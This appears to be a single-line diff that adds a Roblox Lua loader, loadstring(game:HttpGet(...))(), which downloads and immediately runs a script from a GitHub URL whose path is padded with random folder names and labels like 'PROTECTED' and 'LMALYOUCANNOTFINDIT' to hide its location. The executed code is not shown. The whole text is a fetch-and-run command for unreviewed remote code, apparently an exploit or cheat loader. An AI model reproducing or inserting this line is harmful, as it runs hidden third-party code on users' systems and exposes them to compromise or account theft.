@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/hellomynameisalex/areadler-madreed/main/sadjiawewd/dkiawe0sa/dwakesdjawe/sadwe/wads/waea/sdw238223132/wakdiaskda/asd/wae/sa/ae/wasdPROTECTED/LMALYOUCANNOTFINDIT/SKDIWEASDWEA.lua/MAIN.lua", true))()
